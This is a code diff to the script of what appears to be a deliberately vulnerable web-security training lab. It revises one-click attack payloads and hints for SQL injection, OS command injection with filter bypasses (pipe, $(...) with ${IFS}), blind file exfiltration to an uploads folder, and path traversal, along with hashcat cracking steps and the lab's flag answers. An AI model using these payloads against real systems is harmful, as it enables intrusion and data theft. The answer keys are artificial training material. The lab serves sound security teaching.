@@ -186,10 +186,10 @@ const PAYLOADS = {
   expert:{p:"' OR (SELECT SUBSTRING(private_note,1,1) FROM users WHERE username='admin')='F'-- -", n:"Expert — rows are SUPPRESSED (blind match/no-match). This asks 'does admin's private_note start with F?' → match = yes. Walk SUBSTRING(private_note,N,1) and the letter to read the flag char by char (or automate with sqlmap)."}
  },
  cmd:{
-  easy:{p:"127.0.0.1; id", n:"Easy — raw; chain with ;. Goal: who am I? (uid / gid / groups)."},
-  medium:{p:"127.0.0.1 | cat /etc/passwd", n:"Medium — ; and & stripped → pipe |. Goal: enumerate the local users (/etc/passwd)."},
-  hard:{p:"127.0.0.1$(cat${IFS}/etc/hostname)", n:"Hard — ; & | ` and spaces stripped → $(...) with ${IFS}. Goal: read a file through the space-bypass; its content leaks in the ping error."},
-  expert:{p:"127.0.0.1; cat private/cmdi_flag.txt > uploads/pwn.txt", n:"Expert — BLIND (no output). Goal: exfiltrate the flag — write it to a readable file, then open /uploads/pwn.txt in a new tab."}
+  easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — chain with ;. Reads the flag in PLAINTEXT → FLAG{c0mmand_1njection_rce_on_host}."},
+  medium:{p:"127.0.0.1 | cat private/cmdi_flag.b64", n:"Medium — ; & stripped → pipe |. The flag file is BASE64 — pipe it through: ...| base64 -d (or decode the output)."},
+  hard:{p:"127.0.0.1$(cat${IFS}private/cmdi_flag.sha256)", n:"Hard — ; & | ` + spaces stripped → $(...) with ${IFS}. The flag is an UNSALTED SHA-256 (it leaks in the ping error); hashid → hashcat -m 1400 rockyou → butterfly."},
+  expert:{p:"127.0.0.1; cat private/cmdi_flag.salted > uploads/pwn.txt", n:"Expert — BLIND (no output). Exfiltrate: write the file to /uploads/pwn.txt, open it → a SALTED md5 (hash:salt) → hashcat -m 10 rockyou → welcome."}
  },
  pg:{
   easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal. Goal: read a file OUTSIDE the web root (the secret flag)."},
@@ -238,7 +238,7 @@ PAYLOADS.disc={
 _ready=true;
 /* quick-pick: descriptive one-click shortcuts under each card (select the level + fill the input; reuses setLvl) */
 var QLV=['easy','medium','hard','expert'];
-var QLABELS={q:['fingerprint','tables','dump','blind'],cmd:['id','/etc/passwd','hostname','flag'],pg:['secret','/etc/passwd','source','flag'],gb:['<script>','<img>','<svg>','<animate>'],id:['raw id','base64','md5','cookie'],up:['system','passthru','backtick','split-name'],login:['comment','OR','nested OR','/**/'],disc:['plaintext .bak','base64','unsalted hash','salted hash']};
+var QLABELS={q:['fingerprint','tables','dump','blind'],cmd:['plaintext','base64','sha256','salted'],pg:['secret','/etc/passwd','source','flag'],gb:['<script>','<img>','<svg>','<animate>'],id:['raw id','base64','md5','cookie'],up:['system','passthru','backtick','split-name'],login:['comment','OR','nested OR','/**/'],disc:['plaintext .bak','base64','unsalted hash','salted hash']};
 Object.keys(QLABELS).forEach(function(card){
   var lvd=document.getElementById('lv_'+card); if(!lvd) return;
   var row=document.createElement('div'); row.style.cssText='margin:4px 0 2px';
